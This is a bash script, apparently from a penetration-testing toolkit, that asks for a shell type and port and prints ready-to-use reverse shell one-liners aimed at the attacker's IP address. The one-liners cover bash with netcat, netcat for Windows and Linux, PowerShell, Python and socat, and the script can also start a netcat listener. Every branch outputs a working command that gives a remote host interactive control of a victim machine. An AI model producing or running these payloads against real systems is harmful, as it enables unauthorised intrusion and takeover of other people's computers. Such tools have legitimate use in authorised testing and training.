#!/bin/bash

# lhost must be set with export turtlepower_lhost=IP_ADDRESS
[[ -z "$turtlepower_lhost" ]] && { echo -e "LHOST not set do it with export turtlepower_lhost=IP_ADDRESS \n**TRY turtlepower_lhost to output it ** "; exit 1; }


cat /home/kali/scripts/turtlepower/turtlepower_banner.txt
echo "What sort of reverse shell"
echo "1 Bash"
echo "2 Netcat Reverse Windows"
echo "3 Netcat Reverse Nix"
echo "4 Powershell Reverse Shell"
echo "5 Python Reverse Shell (Nix)"
echo "6 Socat Reverse Shell (Nix)"
echo ""
read SHELL_TYPE
echo ""

echo "LHOST is $turtlepower_lhost"
echo "enter LPORT"
read turtlepower_LPORT
echo ""


# "Bash"
if [ "$SHELL_TYPE" = "1" ] ; then
	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $turtlepower_lhost $turtlepower_LPORT >/tmp/f"
	echo "consider following up with:"
	echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
# "Netcat Reverse Windows"
elif [ "$SHELL_TYPE" = "2" ]
then
	echo "nc.exe -nv $turtlepower_lhost $turtlepower_LPORT –e cmd.exe"
# "Netcat Reverse Nix"
elif [ "$SHELL_TYPE" == "3" ]
then
	echo "nc $turtlepower_lhost $turtlepower_LPORT –e /bin/bash"
# "Powershell Reverse Shell"
elif [ "$SHELL_TYPE" == "4" ]
then
	echo "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$turtlepower_lhost',$turtlepower_LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
# "Python Reverse Shell (Nix)"
elif [ "$SHELL_TYPE" == "5" ]
then
	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$turtlepower_lhost\",$turtlepower_LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
	echo ""
	echo "consider following up with:"
	echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
	echo "python -c 'import pty;pty.spawn(\"/bin/sh\")'"
	echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
# "Socat Reverse Shell Linux"
elif [ "$SHELL_TYPE" = "6" ]
then
	echo "On Attacker set up listener:"
	echo ""
	echo "socat file:\`tty\`,raw,echo=0 tcp-listen:$turtlepower_LPORT"
	echo "Or to preserve the socket or if you are having bind address in use errors"
	echo "socat file:\`tty\`,raw,echo=0 tcp-listen:$turtlepower_LPORT,reuseaddr,fork"
	echo ""
	echo "On Victim:"
	echo ""
	echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$turtlepower_lhost:$turtlepower_LPORT"
	echo "(If you need a portable binary try:)"
	echo "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
	echo ""

# not a method
else
	echo "You didn't select a valid shell type!"
fi



# set up listener
echo ""
echo "set up netcat listener? Enter Y else any other key to exit"
read set_up_listener
echo ""
if [ $set_up_listener == 'Y' ]
then
    nc -nlvp $turtlepower_LPORT
else
    exit
fi
